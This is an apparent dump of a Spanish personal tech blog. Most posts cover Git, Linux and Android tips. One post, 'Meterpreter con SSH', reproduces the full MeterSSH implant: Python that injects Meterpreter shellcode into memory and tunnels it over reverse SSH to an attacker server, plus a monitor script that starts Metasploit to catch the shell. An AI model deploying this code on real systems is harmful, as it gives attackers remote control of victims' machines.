Sun Feb 8 19:02:46 2009 -0800 Merge branch \u0026#39;experiment\u0026#39; Ignorando ficheros #####################################################################################\nActualiza tu repositorio remoto en caso que algún otro desarrollador haya eliminado alguna rama remota.\n1 $ git remote prune origin Elimina los cambios realizados que aún no se hayan hecho commit.\n1 $ git reset --hard HEAD Revierte el commit realizado, identificado por el “hash_commit”.\n1 $ git revert \u0026lt;hash_commit\u0026gt; Manejo de ramas Una rama Git es simplemente un apuntador móvil apuntando a una de esas confirmaciones. La rama por defecto de Git es la rama master. Con la primera confirmación de cambios que realicemos, se creará esta rama principal master apuntando a dicha confirmación. En cada confirmación de cambios que realicemos, la rama irá avanzando automáticamente. Y la rama master apuntará siempre a la última confirmación realizada. ¿Qué sucede cuando creas una nueva rama? Pues que simplemente se crea un nuevo apuntador para que lo puedas mover libremente.\nA la hora de trabajar con ramas tenemos 2 opciones\nComo buena práctica dentro de las ramas del árbol es donde deberíamos introducir los cambios a nuestro proyecto y solo luego de comprobar que dichos cambios funcionan y tienen el comportamiento deseado los unimos con el árbol principal. Esto es porque queremos que el árbol se encuentre lo más limpio posible.\nRamas locales Los comandos que usaremos en este apartado serán:\ngit checkout -b git branch (múltiples comandos.) git merge git branch -d Crear una rama local El comando checkout -b nombre_rama es el comando corto para crear una nueva rama a partir de la rama actual y nos cambia a la misma.\n1 2 3 $ git checkout -b sbrk # hemos creado la nueva rama y nos cambiamos a la nueva rama Switched to a new branch \u0026#39;sbrk\u0026#39; Comprobar en que rama estamos El comando git branch se usa para el manejo de ramas, tiene múltiples parámetros pero los mas usados por mi son:\nPara ver en que rama nos encontramos en este momento habría que usar el comando git branch, como resultado obtendremos todas las ramas locales y con un asterisco (*) y en verde la rama en la que nos encontramos actualmente.\n1 2 3 $ git branch * master sbrk Para ver el ultimo comentario de cada rama del proyecto usaremos el parámetro -v git branch -v\n1 2 3 $ git branch -v * master 44dc25c Create init sbrk 44d6g5g add rama Listar todas las ramas locales y remotas.\n1 2 3 4 5 $ git branch -a * master sbrk remotes/origin/HEAD -\u0026gt; origin/master remotes/origin/master REPASAR git branch -r\nCambiar entre ramas Para cambiar de una rama a otra usaremos el comando git checkout nombre_rama\n1 2 3 4 $ git checkout master D content/code/2015_12_03_usos_rsync.md M theme/plumage Switched to branch \u0026#39;master\u0026#39; Unión de ramas Para unir dos ramas tenemos el comando git merge nombre_rama. Hay que tener especial cuidado a la hora de hacer una unión ya que es probable que aparezcan conflictos al intentar unir ambas ramas. Los conflictos ocurren por tratar de unir dos archivos (son el mismo pero están en diferentes ramas) que son diferentes al compararlos linea a linea.\nPara realizar una unión el proceso es el siguiente:\nNos colocamos en la rama en la que queremos agregar la funcionalidad de la otra rama. Hacemos un merge de la rama que queremos unir git merge otra_rama Por ejemplo si queremos añadir a la rama master la funcionalidad desarrollada en la rama sbrk\n1 2 3 4 5 6 7 8 $ git checkout master $ git merge sbrk # Podemos apreciar que la unión se realizó correctamente y sin conflictos. Updating 0022f43..bc8fc31 Fast-forward README.md | 5 +++++ 1 file changed, 5 insertions(+) Eliminar una rama local Cuando queremos eliminar una rama usaremos el comando git branch -d nombre_rama o git branch -D nombre_rama y con esto conseguiremos eliminar la rama.\nEs importante diferenciar entre los parámetros -d elimina la rama solamente si se ha unido sino nos mandara un error y -D elimina la rama aunque no se haya unido.\nUna buena practica es eliminar una rama después de unirla a la rama principal\nPor ejemplo si queremos eliminar la rama sbrk después de haberla unido a la rama principal usaremos el siguiente comando:\n1 2 $ git branch -d sbrk Deleted branch sbrk (was bc8fc31). Resolver conflictos Cuando unimos dos ramas (merge) en ocasiones produciremos conflictos entre ficheros por tener el mismo fichero modificado en ramas diferentes. Cuando ocurre eso git nos abrirá con el editor que tengamos configurado por defecto el fichero que tenga el conflicto, tendremos que buscar las lineas que nos introduce git para indicarnos donde esta el problema que son: \u0026lt;\u0026lt;\u0026lt;\u0026lt;, \u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; y ====== eliminarlas y después procederemos a arreglar el código o texto adecuadamente, después ya podremos hacer el commit y el push.\n1 2 3 4 5 6 7 $ git checkout master $ git merge sbrk # Ocurrió un conflicto Auto-merging README.md CONFLICT (content): Merge conflict in README.md Automatic merge failed; fix conflicts and then commit the result. Ramas remotas Una rama remota es una referencia al estado de una rama local en un repositorio remoto.\nLas ramas remotas tienen como convención de nombre el siguiente formato: (remoto)/(rama), donde la rama principal en un repositorio remoto se llama origin/master y todas las subramas en el repositorio remoto tendrán el prefijo origin y del otro lado el nombre de la rama que queramos darle; en nuestro caso podría ser primera-rama.\nImportante: si no aplicamos el comando git push origin master cada vez que queramos respaldar cambios realizados localmente de nuestra rama principal el estado de la rama remota se quedará rezagado.\nCrear una rama remota Para crear una rama remota primero hay que crear una rama local git checkout -b rama y despues mandarla al servidor con git push origin rama.\nLas ramas locales no se sincronizan automáticamente con las remotas, es un comportamiento que se debe realizar manualmente.\nImportante: Una rama local puede estar enlazada con una rama remota, pero no tienen porque tener el mismo nombre.\n1 2 3 4 5 6 7 8 9 $ git checkout -b sbrk Switched to a new branch \u0026#39;sbrk\u0026#39; # una vez creada la rama vamos a crearla en el repositorio remoto. $ git push origin sbrk Total 0 (delta 0), reused 0 (delta 0) To git@github.com:codeheroco/tutorial-git.git * [new branch] sbrk -\u0026gt; sbrk Eliminar una rama remota Cuando queremos borrar una rama remota ubicada en el servidor lo haremos con git push origin :nombre_rama.\nEsto lo que realiza es decirle al servidor que deseche la rama sbrk. El comando es prácticamente idéntico al que utilizamos para crear la rama remota, la única diferencia es que le pasamos el prefijo : antes del nombre de la rama.\n1 $ git push origin :sbrk Seguimiento de una rama remota Cuando clonamos un repositorio solo se clona la rama principal master, si queremos seguir tambien alguna rama adicional, tendremos que hacerlo manualmente con el comando git checkout --track origin/\u0026lt;nombre_rama\u0026gt; o la opcion corta git checkout -t origin/\u0026lt;nombre_rama\u0026gt;, si existe una rama remota de nombre nombre_rama, al ejecutar este comando se crea una rama local con el nombre nombre_rama para hacer un seguimiento de la rama remota con el mismo nombre.\n1 $ git checkout --track origin/sbrk Si quisieramos colaborar con una rama remota lo que tendriamos que hacer seria crear una nueva rama local (nueva_rama) y enlazarlo con la rama remota ubicada en el servidor (sbrk):\n1 2 3 $ git checkout -b nueva_rama origin/sbrk Branch nueva_rama set up to track remote branch sbrk from origin. Switched to a new branch \u0026#39;nueva_rama\u0026#39; Manejo de submodulos Otras opciones Cambiar la URI (URL) para un repositorio git remoto git remote set-url origin \u0026lt;URL\u0026gt;\nFuente 1\nBorrar un commit git reset --hard HEAD~1\nVer url repositorios configurados git remote -v\nDuplicar un repositorio 1 2 3 4 5 6 7 8 9 10 # Make a bare clone of the repository git clone --bare git@github.com:procamora/old-repository.git # Mirror-push to the new repository cd old-repository.git git push --mirror git@github.com:procamora/new-repository.git # Remove our temporary local repository cd .. rm -rf old-repository.git Fuente 1\nTrabajar con submodulos git submodule add git@github.com:procamora/procamora.github.io.git output\nFuente 1\nFuentes usadas: wikipedia, librosweb, codehero\n","date":"2016-02-19T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/guia-git/","title":"Guia git"},{"content":"http://askubuntu.com/questions/462381/cant-mount-ntfs-drive-the-disk-contains-an-unclean-file-system\n1 2 3 4 5 6 7 8 9 Error mounting /dev/sdf1 at /media/root/Users: Command-line `mount -t \u0026#34;ntfs\u0026#34; -o \u0026#34;uhelper=udisks2,nodev,nosuid,uid=0,gid=0,dmask=0077,fmask=0177\u0026#34; \u0026#34;/dev/sdf1\u0026#34; \u0026#34;/media/root/Users\u0026#34;\u0026#39; exited with non-zero exit status 13: ntfs_attr_pread_i: ntfs_pread failed: Error de entrada/salida Failed to read NTFS $Bitmap: Error de entrada/salida NTFS is either inconsistent, or there is a hardware fault, or it\u0026#39;s a SoftRAID/FakeRAID hardware. In the first case run chkdsk /f on Windows then reboot into Windows twice. The usage of the /f parameter is very important! If the device is a SoftRAID/FakeRAID then first activate it and mount a different device under the /dev/mapper/ directory, (e.g. /dev/mapper/nvidia_eahaabcc1). Please see the \u0026#39;dmraid\u0026#39; documentation for more details. ","date":"2016-02-11T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/cant-mount-ntfs-drive/","title":"Can't Mount NTFS drive"},{"content":"Descargar paquete de spotify de su repositorio oficial, o del directorio de descargas\nUna vez descargado instalarlo con dpkg\ndpkg -i Descargas/spotify-client-0.9.17_0.9.17.8.gd06432d.31-1_amd64.deb\n***Precaución*** No hacerlo de modo gráfico ya que se queda colgado a mitad de la instalación, instalar con dpkg\nEn kali me da este error\nspotify: error while loading shared libraries: libgcrypt.so.11: cannot open shared object file: No such file or directory Se soluciona instalando la librería libgcrypt11, puedes descargarla desde su repositorio oficial o del directorio de descargas\nUna vez descargado ejecutar:\ndpkg -i libgcrypt11_1.5.0-5+deb7u1_amd64.deb\n","date":"2016-01-31T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/instalar-spotify-kali/","title":"Instalar spotify en kali"},{"content":"http://lml.ls.fi.upm.es/ep/make.html\n","date":"2016-01-30T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/uso_make/","title":"Usos de make"},{"content":"Cuando ejecutas linux como root obtienes el siguiente resultado:\n1 2 3 4 VLC is not supposed to be run as root. Sorry. If you need to use real-time priorities and/or privileged TCP ports you can use ./vlc2-wrapper (make sure it is Set-UID root and cannot be run by non-trusted users first). Para poder ejecutarlo con éxito es tan simple como abrir el binario de vlc con un editor hexadecimal y sustituir geteuid por getppid\nghex /usr/bin/vlc\nbuscar: geteuid\nremplazar: getppid\nCon python:\n1 2 3 4 5 6 7 8 9 10 11 12 13 #!/usr/bin/env python # -*- coding= utf-8 -*- # nombre_fichero = \u0026#39;vlc\u0026#39; with open(nombre_fichero, \u0026#39;rb\u0026#39;) as f: s=f.read() s=s.replace(b\u0026#39;geteuid\u0026#39;, b\u0026#39;getppid\u0026#39;) with open(nombre_fichero, \u0026#39;wb\u0026#39;) as f: f.write(s) Con bash: ```bash sed -i 's/geteuid/getppid/' /usr/bin/vlc ``` En caso de haber instalado vlc a través del tarball seria tan simple como recompilarlo pasando \u0026ndash;enable-run-as-root a ./configure.\nFuentes: taringa\n","date":"2016-01-29T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/2016_01_09_usar-vlc-como-root/","title":"Usar vlc como root"},{"content":"Instrucciones para instalar la rom de Chroma en un Nexus 4\nRequisitos: Tener el móvil con al menos el 50% de batería. Tener liberado el bootloader. Tener twrp instalado, en caso de no tenerlo instalarlo (url de donde explico como instalarlo) tener Android 5.0.1 (no se si es necesario) #Pasos:\nDescargarse el zip de la rom de: descarga\nCon twrp hacer un advanced wipe de:\nDalvik Cache System Data Cache Poner foto\nPoner el zip de la rom en la memoria interna del dispositivo\nmv chroma_mako-2016-01-18.zip /media/nexus4/Internal Storage/\ninstalar la zip con twrp\nponer foto\nInstalar gaps\nHacer un wipe(No se si es necesario)\nReiniciar dispositivo y esperar unos 5-10 min a que se inicie correctamente\nhttp://forum.xda-developers.com/nexus-4/development/rom-chroma-03-31-2015-layers-t3069936\n","date":"2016-01-28T00:00:00Z","image":"https://www.procamora.com/covers/android.png","permalink":"https://www.procamora.com/p/uso-de-adb/","title":"Instalar Chroma en Nexus 4"},{"content":"Instrucciones para instalar la rom de Remix OS 1.5 en una Nexus 9\n#Requisitos:\nTener el móvil con al menos el 50% de batería. Tener liberado el bootloader. Tener twrp instalado, en caso de no tenerlo instalarlo. (url de donde explico como instalarlo). tener Android 5.0.1 (no se si es necesario). #Pasos:\nDescargarse el zip de la rom de: descarga\nCon twrp hacer un advanced wipe de:\nDalvik Cache System Data Cache {:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nPoner el zip de la rom en la memoria interna del dispositivo\nmv chroma_mako-2016-01-18.zip /media/nexus9/Internal Storage/\ninstalar la zip con twrp {:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;} {:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nInstalar gaps\nponer foto\nHacer un wipe(No se si es necesario)\nReiniciar dispositivo y esperar unos 5-10 min a que se inicie correctamente\nhttp://forum.xda-developers.com/nexus-9/development/5-1-1r6-resurrection-remix-unofficial-t3157330\n","date":"2016-01-27T00:00:00Z","image":"https://www.procamora.com/covers/android.png","permalink":"https://www.procamora.com/p/instalar-remix-os-en-nexus-9/","title":"Instalar Remix OS en Nexus 9"},{"content":"Proceso para instalar el recovery de TWRP en Android debemos hacer lo siguiente:\nRequisitos: Tener el móvil con al menos el 50% de batería. Tener instalados los drivers del dispositivo. Descarga Tener instalado ADB Tools. Tener habilitada la depuración USB. {:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;} Recomendado: Tener liberado el bootloader. Pasos: Para buscar la imagen de TWRP de nuestro dispositivo tenemos que buscarla desde aquí\nUna vez que hemos buscado la pagina de nuestro dispositivo y nos hemos descargado la imagen hay que reiniciar el dispositivo en el modo bootloader, se puede hacer de 2 formas distintas:\nCon el comando: adb reboot bootloader Botón Power + Bajar Volumen Comprobamos que fastboot detecta el dispositivo con fastboot devices, si lo detecta procedemos a instalar twrp\nfastboot flash recovery twrp-2.8.x.x-xxx.img\nUna vez que lo hemos instalado procedemos a reiniciar el dispositivo y ya lo tenemos listo con twrp instalado\nfastboot reboot\nEn resumen:\n1 2 3 adb reboot bootloader fastboot flash recovery twrp-2.8.x.x-xxx.img fastboot reboot Descargas de imágenes y paginas oficiales: (a fecha de 22/01/2016) Nexus 4: Pagina url\nNexus 9: Pagina url\nNexus 5X: Pagina url\nFuentes: 0 1\n","date":"2016-01-26T00:00:00Z","image":"https://www.procamora.com/covers/android.png","permalink":"https://www.procamora.com/p/instalar-twrp-en-android/","title":"Instalar TWRP en android"},{"content":"Introducción Cuando queremos descargar un video de youtube tenemos multiples opciones, tanto aplicaciones como online. La aplicación que mejor resultados me ha dado es youtube-dl.\nyoutube-dl Permite tanto descargar videos como listas de reproducción.\nsudo pip install youtube-dl\n$ youtube-dl -f \u0026quot;(bestvideo+bestaudio/best)\u0026quot; \u0026quot;https://www.youtube.com/watch?v=tbVmV4XJNlo\u0026quot;\nDocumentacion\npytube sudo pip install pytube\npytube -e mp4 -r 720p \u0026quot;https://www.youtube.com/watch?v=tbVmV4XJNlo\u0026quot;\nPd: No permite descargar vídeos a 1080 a fecha de hoy 22/01/2016\npafy Para instalar pafy\nsudo pip install pafy\nDownload best available resolution (-b):\n$ ytdl -b \u0026quot;http://www.youtube.com/watch?v=cyMHZVT91Dw\u0026quot;\npara ver las calidades disponibles ejecutamos ytdl tbVmV4XJNlo\ny para seleccionar con que calidad queremos descargarnoslo: ytdl -n2 cyMHZVT91Dw\nFuente: pafy\nPd: No permite descargar vídeos a 1080 a fecha de hoy 22/01/2016\n","date":"2016-01-25T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/descargar-video-youtube-con-python/","title":"Descargar video youtube con python"},{"content":"#Requisitos: Tener instalados los drivers del dispositivo\n#Pasos:\nadb reboot bootloader\nA la hora de instalar Phoenix OS 1.0 en la nexus 9 LTE he tenido este problema al ejecutar el script de instalación ./flash-all.sh\n1 2 3 sending \u0026#39;system\u0026#39; (678746 KB)... FAILED (remote: data length is too large) finished. total time: 3.146s ere are the steps i took to manually flash: run the flash-all.bat up until the point where it fails\n1 2 3 4 5 6 7 8 unzip Nexus9_flounder_jenkins_stable_11_2016-01-04_20-25.zip fastboot flash system system.img fastboot flash recovery recovery.img fastboot flash cache cache.img fastboot flash boot boot.img fastboot flash userdata vendor.img # - looks like userdata should be vendor? - mine worked with userdata regardless from tablet - select hboot select factory reset IMPORTANTE INSTALAR LA PLAY STORE, ESTA LA APK PARA BAJÁRSELA EN DESCARGAS https://www.reddit.com/r/RemixOS/comments/40olez/install_google_play_services_on_remix_os_official/\ninstalar gaps. lo anterior no me funciona\nhttp://opengapps.org/\nhttp://www.xda-developers.com/download-google-apps-gapps/\nhttp://forum.xda-developers.com/nexus-9/help/factory-image-flash-t2929019/post56529332#post56529332\n","date":"2016-01-19T00:00:00Z","image":"https://www.procamora.com/covers/android.png","permalink":"https://www.procamora.com/p/instalar-phoenix-os/","title":"Instalar Phoenix OS en nexus 9"},{"content":"Fuente 0\n","date":"2016-01-16T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/chrome-en-kali-linux/","title":"chrome en kali linux"},{"content":"http://www.redeszone.net/gnu-linux/vnc-server/ http://www.ajpdsoft.com/modules.php?name=News\u0026file=article\u0026sid=406\n","date":"2016-01-15T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/crear-un-servidor-con-vnc/","title":"Crear un servidor con vnc"},{"content":"Cuando tienes varios monitores, guake por defecto arranca en el monitor de la izquierda, para colocarlo en la derecha hay que editar el ejecutable de guake\nvim /usr/bin/guake\nBuscar la función get_final_window_rect y sustituirla por esta:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 def get_final_window_rect(self): \u0026#34;\u0026#34;\u0026#34;Gets the final size of the main window of guake. The height is the window_height property, width is window_width and the horizontal alignment is given by window_alignment. \u0026#34;\u0026#34;\u0026#34; screen = self.window.get_screen() height = self.client.get_int(KEY(\u0026#39;/general/window_height\u0026#39;)) width = 100 halignment = self.client.get_int(KEY(\u0026#39;/general/window_halignment\u0026#39;)) # future we might create a field to select which monitor you # wanna use #monitor = 0 # use the left most monitor monitor = screen.get_n_monitors() - 1 # use the right most monitor monitor_rect = screen.get_monitor_geometry(monitor) window_rect = monitor_rect.copy() window_rect.height = window_rect.height * height / 100 window_rect.width = window_rect.width * width / 100 if width \u0026lt; monitor_rect.width: if halignment == ALIGN_CENTER: window_rect.x = monitor_rect.x + (monitor_rect.width - window_rect.width) / 2 elif halignment == ALIGN_LEFT: window_rect.x = monitor_rect.x elif halignment == ALIGN_RIGHT: window_rect.x = monitor_rect.x + monitor_rect.width - window_rect.width window_rect.y = monitor_rect.y return window_rect Fuentes: 0\n","date":"2016-01-09T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/2016_01_09_cambiar-monitor-guake/","title":"Cambiar monitor guake"},{"content":"There are two files, monitor.py and meterssh.py.\nmonitor.py – run this in order to listen for an SSH connection, it will poll for 8021 on localhost for an SSH tunnel then spawn Metasploit for you automatically to grab the shell.\nmeterssh.py – this is what you would deploy to the victim machine – note that most windows machines wont have Python installed, its recommended to compile Python with py2exe or pyinstaller.\nFields you need to edit inside meterssh.py\n1 2 3 4 5 6 7 user = \u0026#34;sshuser\u0026#34; # password for SSH password = \u0026#34;sshpw\u0026#34; # this is where your SSH server is running rhost = \u0026#34;192.168.1.1\u0026#34; # remote SSH port - this is the attackers SSH server port = \u0026#34;22\u0026#34; ##meterssh.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 from socket import * import paramiko import multiprocessing import time import subprocess import ctypes import thread import threading import select # http://www.hackplayers.com/2014/11/meterssh-meterpreter-sobre-ssh.html # https://github.com/trustedsec/meterssh ##################################################################################### # # MeterSSH # Tunneling Shellcode over SSH # Version 1.0 # #\tWritten by: David Kennedy (ReL1K) #\tWebsite: https://www.trustedsec.com #\tTwitter: @TrustedSec @HackingDave # # Simple add your username, password, remote IP, and remote port # for your SSH server and watch the magic. # # Note that you can easily make this into a binary with pyinstaller or py2exe # ##################################################################################### # define our shellcode injection code through ctypes def inject(shellcode): # special thanks to Debasish Mandal (http://www.debasish.in/2012_04_01_archive.html) ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr), ctypes.c_int(len(shellcode))) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))) ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))) ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1)) # base socket handler for reverse SSH def handler(chan, host, port): sock = socket() try: sock.connect((host, port)) except Exception, e: print e while True: r, w, x = select.select([sock, chan], [], []) if sock in r: data = sock.recv(1024) if len(data) == 0: break chan.send(data) if chan in r: data = chan.recv(1024) if len(data) == 0: break sock.send(data) chan.close() sock.close() # here is where we start the transport request for port forward on victim then tunnel over via thread and handler def reverse_forward_tunnel(server_port, remote_host, remote_port, transport): transport.request_port_forward(\u0026#39;\u0026#39;, server_port) # while we accept transport via thread handler continue loop while True: chan = transport.accept(1000) if chan is None: continue thr = threading.Thread(target=handler, args=(chan, remote_host, remote_port)) thr.setDaemon(True) # start thread thr.start() # main class here def main(user,password, rhost, port): server = [rhost, int(port)] # our ssh server remote = [\u0026#39;127.0.0.1\u0026#39;, int(8021)] # what we want to tunnel client = paramiko.SSHClient() # use the paramiko SSHClient client.load_system_host_keys() # load SSH keys client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # automatically add SSH key try: client.connect(server[0], server[1], username=user, key_filename=None, look_for_keys=False, password=password) # except exception except Exception, e: print \u0026#39;*** Failed to connect to %s:%d: %r\u0026#39; % (server[0], server[1], e) try: reverse_forward_tunnel(8021, remote[0], remote[1], client.get_transport()) # except exception except Exception, e: print e if __name__ == \u0026#39;__main__\u0026#39;: # used when you need to use multiprocessing and use pywin32 or py2exe and byte compile to a binary multiprocessing.freeze_support() # this is traditional metasploit windows/meterpreter/bind_tcp that binds on port 8021 - meterssh will then take port 8021 and wrap over SSH shellcode = r\u0026#34;\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\\x85\\xc0\\x74\\x4a\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b\\x58\\x20\\x01\\xd3\\xe3\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\x31\\xc0\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xeb\\x86\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x31\\xdb\\x53\\x68\\x02\\x00\\x1f\\x55\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\xc2\\xdb\\x37\\x67\\xff\\xd5\\x53\\x57\\x68\\xb7\\xe9\\x38\\xff\\xff\\xd5\\x53\\x53\\x57\\x68\\x74\\xec\\x3b\\xe1\\xff\\xd5\\x57\\x97\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x01\\xc3\\x29\\xc6\\x85\\xf6\\x75\\xec\\xc3\u0026#34; shellcode = shellcode.decode(\u0026#34;string_escape\u0026#34;) shellcode = bytearray(shellcode) print \u0026#34;[*] Shellcode injection loaded into memory...\u0026#34; time.sleep(2) p = multiprocessing.Process(target=inject, args=(shellcode,)) print \u0026#34;[*] Spawning meterpreter on localhost on port: 8021\u0026#34; jobs = [] jobs.append(p) p.start() # this starts the main routine which is where we get all our port forward stuff # user for ssh - note that you can easily modify this to support pub/priv keys user = \u0026#34;sshuser\u0026#34; # password for SSH password = \u0026#34;sshpw\u0026#34; # this is where your SSH server is running rhost = \u0026#34;192.168.1.1\u0026#34; # remote SSH port - this is the attackers SSH server port = \u0026#34;22\u0026#34; print \u0026#34;[*] Tunneling SSH, this takes a moment.\u0026#34; print \u0026#34;[*] You should have a shell raining in a sec..\u0026#34; time.sleep(3) thread.start_new_thread(main,(user,password, rhost, port,)) ##monitor.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #!/usr/bin/python import time import subprocess import re # # Reverse SSH tunnel monitor for meterssh. # # Simply run python monitor.py and wait for your shell to come back # # Written by: David Kennedy (ReL1K) # Website: https://www.trustedsec.com # Twitter: @TrustedSec @HackingDave # # print \u0026#34;[*] Launching count monitor at 5 second intervals...\u0026#34; while 1: print \u0026#34;[*] Polling... Waiting for connection into SSH encrypted tunnel...\u0026#34; proc = subprocess.Popen(\u0026#34;netstat -antp | grep 8021\u0026#34;, stdout=subprocess.PIPE, shell=True) stdout = proc.communicate()[0] if \u0026#34;8021\u0026#34; in stdout: print \u0026#34;[*] Encrypted tunnel identified. Yipee, we gots a shell!\u0026#34; time.sleep(1) print \u0026#34;[*] Creating a quick Metasploit answer file for you..\u0026#34; filewrite = file(\u0026#34;answer.txt\u0026#34;, \u0026#34;w\u0026#34;) filewrite.write(\u0026#34;use multi/handler\\nset payload windows/meterpreter/bind_tcp\\nset RHOST 0.0.0.0\\nset LPORT 8021\\nexploit\u0026#34;) filewrite.close() time.sleep(1) print \u0026#34;[*] Launching Metasploit... Wait one minute...\u0026#34; subprocess.Popen(\u0026#34;msfconsole -r answer.txt\u0026#34;, shell=True).wait() print \u0026#34;[*] All done! Wrapping things up.\u0026#34; subprocess.Popen(\u0026#34;rm answer.txt\u0026#34;, shell=True).wait() break else: time.sleep(5) Fichero\nhttps://www.trustedsec.com/november-2014/meterssh-meterpreter-ssh/\n","date":"2015-12-29T00:00:00Z","image":"https://www.procamora.com/covers/pentesting.png","permalink":"https://www.procamora.com/p/monitor/","title":"Meterpreter con SSH"},{"content":"Parece ser que la combinación en las versiones de GNOME Shell a utilizar son: CTRL + supr si quieres que pasen por la papelera o SHIFT + supr si quieres eliminar archivos o carpetas directamente.\nEn las ediciones modernas de este escritorio (GNOME Shell 3.6 para arriba) una forma sencilla de hacerlo es siguiendo el método que nos proponen en la wiki de Arch que consiste en editar el archivo oculto de nuestro directorio personal ~/.config/nautilus/accels (una copia de seguridad del archivo antes de tocarlo nunca de está de más..)\nSe trata de modificar la linea: 1\n; (gtk_accel_path \u0026quot;\u0026lt;Actions\u0026gt;/DirViewActions/Trash\u0026quot; \u0026quot;\u0026lt;Primary\u0026gt;Delete\u0026quot;)\ndescomentándola quitándole el punto y coma (;) del principio de la linea y eliminando donde pone , tal que como figura en la captura de imagen: 1\n(gtk_accel_path \u0026quot;\u0026lt;Actions\u0026gt;/DirViewActions/Trash\u0026quot; \u0026quot;Delete\u0026quot;)\nDespués tan solo tenemos que guardar los cambios, reiniciar nautilus y ya dispondremos de nuestra tecla de suprimir activada :-)\nHay que decir que este cambio no deshabilita ninguno de los atajos de teclado que tengáis establecidos previamente.\nFuentes: [1][0] [0]: http://lamiradadelreplicante.com/2014/11/17/activar-la-tecla-suprimir-en-gnome-shell/\n","date":"2015-12-27T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/activarteclasuprimir/","title":"Activar Tecla Suprimir"},{"content":"En esta entrada veremos como configurar Sublime Text 2 para que al presionar ctrl + b se compile y ejecute nuestra aplicación en C++.\nLo primero que debemos hacer es iniciar Sublime Text, una vez lo hallamos hecho, vamos a Tools -\u0026gt; Build System -\u0026gt; New Build System\u0026hellip; Esto abrirá un pequeño archivo con unas lineas escritas en JSON, de modo que debemos copiar el siguiente código y pegarlo en este archivo.\nEn mi caso la ruta es: %AppData%\\Sublime Text 2\\Packages\\User\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 //Windows { 